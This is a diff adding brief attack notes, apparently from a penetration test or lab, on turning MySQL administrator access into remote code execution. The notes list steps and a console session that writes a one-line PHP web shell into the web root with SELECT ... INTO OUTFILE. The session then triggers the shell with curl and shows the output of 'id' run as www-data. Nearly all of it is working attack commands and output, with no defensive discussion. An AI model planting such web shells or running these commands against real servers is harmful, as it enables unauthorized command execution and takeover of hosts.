@@ -1,0 +1,36 @@
+Access the remote database using administrator credentials
+Create a new table in the main database
+Inject PHP code to gain command execution
+Example code: <?php $cmd=$_GET["cmd"];system($cmd);?>
+Drop table contents onto a file the user can access
+Execute and obtain RCE on the host.
+
+EXAMPLE:
+
+create table pwned (pwned varchar (255));
+mysql> show tables;
+show tables;
++-----------------------+
+| Tables_in_DashboardDB |
++-----------------------+
+| pwned                 |
+| users                 |
++-----------------------+
+
+mysql> select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/rev.php';  
+
+mysql> exit
+exit
+Bye
+
+www-data@56c62414eb54:~/admin$ curl 192.168.100.1:8080/rev.php?cmd=id
+curl 192.168.100.1:8080/rev.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@56c62414eb54:~/admin$     
+
+
+
+
+
+
